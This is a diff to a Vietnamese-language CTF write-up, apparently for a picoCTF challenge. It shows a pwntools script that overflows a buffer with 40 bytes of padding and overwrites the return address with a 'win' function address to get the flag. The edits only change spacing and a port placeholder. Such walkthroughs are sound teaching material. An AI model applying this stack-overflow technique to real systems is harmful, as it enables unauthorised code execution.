@@ -96,20 +96,20 @@ Dưới đây là nội dung file payload của bạn
 ```python
 from pwn import *
 
-HOST = "mysterious-sea.picoctf.net"#tên máy chủ
-PORT = mã port trong challenge của bạn #port của máy chủ đó
+HOST = "mysterious-sea.picoctf.net" #tên máy chủ
+PORT = #mã port trong challenge của bạn #port của máy chủ đó
 
-p = remote(HOST, PORT)#kết nối với máy chủ của challenge
+p = remote(HOST, PORT) #kết nối với máy chủ của challenge
 
-p.recvuntil(b"Please enter your name: ")#chạy chương trình cho đến khi gặp dòng chữ trên sau đó truyền payload ghi ở dưới
+p.recvuntil(b"Please enter your name: ") #chạy chương trình cho đến khi gặp dòng chữ trên sau đó truyền payload ghi ở dưới
 
 offset = 40 # đây là offset mà khi nãy ta dùng lệnh cyclic để tìm
 win_addr = 0x401256 #đây là địa chỉ hàm win mà nãy ta đã tìm được
 
 payload = b"A" * offset + p64(win_addr) #đây là nội dung payload nhớ là kiểm tra xem file binary là bao nhiêu bit nếu mà là 32 thì sửa p64 thành p32
 
-p.sendline(payload)#gửi mã độc 
-p.interactive()#nhận kết quả
+p.sendline(payload) #gửi mã độc 
+p.interactive() #nhận kết quả
 ```
 ## 7. Thực thi file payload của bạn để lấy flag
 **Lưu ý!!!!: phải để địa chỉ file payload và file binary trong cùng một thư mục**
